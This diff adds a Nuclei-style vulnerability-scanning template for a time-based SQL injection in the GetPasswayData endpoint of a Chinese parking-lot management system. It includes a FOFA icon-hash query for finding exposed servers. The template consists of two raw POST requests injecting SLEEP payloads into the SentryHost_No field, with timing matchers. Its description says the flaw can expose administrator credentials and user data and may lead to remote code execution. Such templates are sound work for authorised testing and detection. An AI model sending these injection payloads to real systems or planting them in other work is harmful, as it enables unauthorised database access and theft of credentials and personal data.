@@ -1,0 +1,41 @@
+id: tingchechang-GetPasswayData-sql
+
+info:
+  name: 停车场后台管理系统 GetPasswayData 接口 SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="938984120"
+      停车场后台管理系统在 GetPasswayData 接口处理中存在 SQL 注入缺陷。攻击者可通过构造恶意请求实现数据库敏感信息提取，包括但不限于管理员账户凭证及用户隐私数据。在特定权限条件下，该漏洞可能被利用部署远程代码执行载荷，导致服务器控制权丧失。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486909&idx=1&sn=38196687551dfb4accd375d9a27c9dac&chksm=c267b88ef5103198acdeab3ef21f55a6c24c9d8cb8f7a5216b2095213bdecd912a7e3fbf005b&token=239710718&lang=zh_CN#rd
+  tags: 停车场后台管理系统
+
+
+http:
+- raw:
+  - |
+    POST /LaneMonitor/GetPasswayData HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    SentryHost_No=1';SELECT+SLEEP(4)#
+
+  - |
+    POST /LaneMonitor/GetPasswayData HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    SentryHost_No=1';SELECT+SLEEP(8)#
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
